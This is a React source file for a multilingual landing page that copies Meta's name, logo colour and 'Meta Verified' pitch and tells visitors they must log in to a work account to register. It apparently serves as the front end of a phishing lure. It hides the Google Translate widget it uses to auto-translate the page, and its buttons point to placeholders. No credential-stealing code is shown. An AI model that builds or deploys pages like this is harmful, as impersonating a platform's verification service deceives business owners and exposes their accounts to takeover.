import React, { useEffect } from "react";

declare global {
  interface Window {
    google: any;
    googleTranslateElementInit: any;
  }
}

export default function App() {
  const lang =
    typeof navigator !== "undefined"
      ? navigator.language.split("-")[0]
      : "en";

  const text: any = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start now",
      register: "Register",
      title:
        "Let the whole world know that you take business seriously.",
      desc:
        "Meta Verified helps you build credibility with new audiences and protect your brand.",
    },

    vi: {
      begin: "Bắt đầu",
      advertisement: "Quảng cáo",
      learn: "Tìm hiểu",
      support: "Hỗ trợ",
      schedule: "Đặt lịch gọi",
      start: "Bắt đầu ngay",
      register: "Đăng ký",
      title:
        "Hãy để cả thế giới biết rằng bạn nghiêm túc với doanh nghiệp của mình.",
      desc:
        "Meta Verified giúp bạn xây dựng uy tín và bảo vệ thương hiệu.",
    },

    fr: {
      begin: "Commencer",
      advertisement: "Publicité",
      learn: "Apprendre",
      support: "Support",
      schedule: "Planifier un appel",
      start: "Commencer maintenant",
      register: "S'inscrire",
      title:
        "Montrez au monde entier que vous prenez votre entreprise au sérieux.",
      desc:
        "Meta Verified vous aide à protéger votre marque.",
    },

    de: {
      begin: "Start",
      advertisement: "Werbung",
      learn: "Lernen",
      support: "Support",
      schedule: "Anruf planen",
      start: "Jetzt starten",
      register: "Registrieren",
      title:
        "Zeigen Sie der Welt, dass Sie Ihr Unternehmen ernst nehmen.",
      desc:
        "Meta Verified hilft Ihnen beim Schutz Ihrer Marke.",
    },

    es: {
      begin: "Comenzar",
      advertisement: "Publicidad",
      learn: "Aprender",
      support: "Soporte",
      schedule: "Programar llamada",
      start: "Comenzar ahora",
      register: "Registrarse",
      title:
        "Hazle saber al mundo que tomas en serio tu negocio.",
      desc:
        "Meta Verified te ayuda a proteger tu marca.",
    },
  };

  const t = text[lang] || text.en;

  useEffect(() => {
    const userLang = navigator.language || "en";
    const shortLang = userLang.split("-")[0];

    window.googleTranslateElementInit = () => {
      if (
        window.google &&
        window.google.translate &&
        window.google.translate.TranslateElement
      ) {
        new window.google.translate.TranslateElement(
          {
            pageLanguage: "en",
            autoDisplay: false,
          },
          "google_translate_element"
        );

        setTimeout(() => {
          const select = document.querySelector(
            ".goog-te-combo"
          ) as HTMLSelectElement | null;

          if (select) {
            select.value = shortLang;
            select.dispatchEvent(new Event("change"));
          }
        }, 100);
      }
    };

    const addScript = document.createElement("script");

    addScript.src =
      "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";

    addScript.async = true;

    document.body.appendChild(addScript);

    return () => {
      document.body.removeChild(addScript);
    };
  }, []);

  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
  ];

  return (
    <>
      <style>{`
        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Arial, Helvetica, sans-serif;
        }

        body{
          background:#f5f5f5;
          overflow-x:hidden;
          top:0 !important;
        }

        .goog-te-banner-frame.skiptranslate,
        iframe.skiptranslate,
        .goog-tooltip,
        .goog-tooltip:hover,
        .goog-logo-link,
        .goog-te-gadget span,
        .goog-te-gadget-icon {
          display:none !important;
        }

        .goog-text-highlight{
          background:none !important;
          box-shadow:none !important;
        }

        .goog-te-gadget{
          color:transparent !important;
        }

        #google_translate_element{
          position:absolute;
          top:-9999px;
          left:-9999px;
        }

        .app{
          width:100%;
          min-height:100vh;
        }

        .header{
          width:100%;
          height:74px;
          background:#fff;
          border-bottom:1px solid #ddd;
          position:sticky;
          top:0;
          z-index:1000;
        }

        .header-container{
          max-width:1400px;
          margin:auto;
          height:100%;
          display:flex;
          align-items:center;
          justify-content:space-between;
          padding:0 40px;
        }

        .logo-nav{
          display:flex;
          align-items:center;
          gap:50px;
        }

        .logo{
          font-size:34px;
          color:#1877f2;
          font-weight:700;
        }

        .nav{
          display:flex;
          gap:35px;
        }

        .nav a{
          text-decoration:none;
          color:#111827;
          font-size:15px;
          font-weight:500;
        }

        .nav a:hover{
          color:#1877f2;
        }

        .header-buttons{
          display:flex;
          align-items:center;
          gap:15px;
        }

        .call-btn{
          border:1px solid #1877f2;
          background:#fff;
          color:#1877f2;
          padding:12px 20px;
          border-radius:999px;
          font-weight:600;
          cursor:pointer;
        }

        .start-btn{
          border:none;
          background:#1877f2;
          color:#fff;
          padding:12px 24px;
          border-radius:14px;
          font-weight:600;
          cursor:pointer;
        }

        .banner{
          width:100%;
          background:#101820;
          color:#fff;
          text-align:center;
          padding:16px;
          font-size:15px;
        }

        .hero{
          max-width:1400px;
          margin:auto;
          min-height:calc(100vh - 120px);
          display:flex;
          align-items:center;
          justify-content:space-between;
          gap:80px;
          padding:80px 40px;
        }

        .hero-left{
          max-width:620px;
        }

        .verified{
          width:82px;
          height:82px;
          border-radius:50%;
          background:#1877f2;
          display:flex;
          align-items:center;
          justify-content:center;
          color:#fff;
          font-size:40px;
          margin-bottom:30px;
        }

        .hero-title{
          font-size:72px;
          line-height:1.05;
          font-weight:600;
          color:#111827;
          margin-bottom:30px;
        }

        .hero-desc{
          font-size:20px;
          line-height:1.8;
          color:#4b5563;
          margin-bottom:40px;
        }

        .register-btn{
          border:none;
          background:#1877f2;
          color:#fff;
          padding:18px 38px;
          border-radius:999px;
          font-size:18px;
          font-weight:600;
          cursor:pointer;
        }

        .small-text{
          margin-top:35px;
          font-size:14px;
          line-height:1.9;
          color:#6b7280;
        }

        .small-text span{
          color:#1877f2;
          cursor:pointer;
        }

        .hero-right{
          position:relative;
        }

        .phone-grid{
          display:grid;
          grid-template-columns:repeat(2, 280px);
          gap:24px;
          transform:rotate(-6deg);
        }

        .card{
          width:280px;
          height:560px;
          border-radius:36px;
          overflow:hidden;
          background:#fff;
          box-shadow:0 20px 50px rgba(0,0,0,0.18);
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        .offset-top{
          margin-top:60px;
        }

        .offset-bottom{
          margin-top:-60px;
        }

        @media(max-width:900px){
          .nav{
            display:none;
          }

          .hero{
            flex-direction:column;
            text-align:center;
          }

          .hero-title{
            font-size:50px;
          }

          .phone-grid{
            grid-template-columns:1fr 1fr;
            transform:none;
          }

          .card{
            width:220px;
            height:440px;
          }
        }

        @media(max-width:600px){
          .header-container{
            padding:0 20px;
          }

          .call-btn{
            display:none;
          }

          .hero{
            padding:60px 20px;
          }

          .hero-title{
            font-size:40px;
          }

          .phone-grid{
            grid-template-columns:1fr;
          }

          .card{
            width:260px;
            height:480px;
          }

          .offset-top,
          .offset-bottom{
            margin-top:0;
          }
        }
      `}</style>

      <div className="app">
        <header className="header">
          <div className="header-container">
            <div className="logo-nav">
              <div className="logo">Meta</div>

              <nav className="nav">
                <a href="#">{t.begin}</a>
                <a href="#">{t.advertisement}</a>
                <a href="#">{t.learn}</a>
                <a href="#">{t.support}</a>
              </nav>
            </div>

            <div className="header-buttons">
              <div
                id="google_translate_element"
                style={{ display: "none" }}
              />

              <button className="call-btn">
                {t.schedule}
              </button>

              <button
                className="start-btn"
                onClick={() =>
                  window.open(
                    "https://example.com",
                    "_blank"
                  )
                }
              >
                {t.start}
              </button>
            </div>
          </div>
        </header>

        <div className="banner">
          Register a verified Meta account on Facebook and Instagram.
        </div>

        <section className="hero">
          <div className="hero-left">
            <div className="verified">✓</div>

            <h1 className="hero-title">{t.title}</h1>

            <p className="hero-desc">{t.desc}</p>

            <button className="register-btn">
              {t.register}
            </button>

            <div className="small-text">
              To register for a verified Meta account for businesses,
              you must log in to your work account.
              <br />
              <br />
              <span>Instagram</span> or{" "}
              <span>Business Page</span>
            </div>
          </div>

          <div className="hero-right">
            <div className="phone-grid">
              <div className="card">
                <img src={images[0]} alt="" />
              </div>

              <div className="card offset-top">
                <img src={images[1]} alt="" />
              </div>

              <div className="card offset-bottom">
                <img src={images[2]} alt="" />
              </div>

              <div className="card">
                <img src={images[3]} alt="" />
              </div>
            </div>
          </div>
        </section>
      </div>
    </>
  );
}
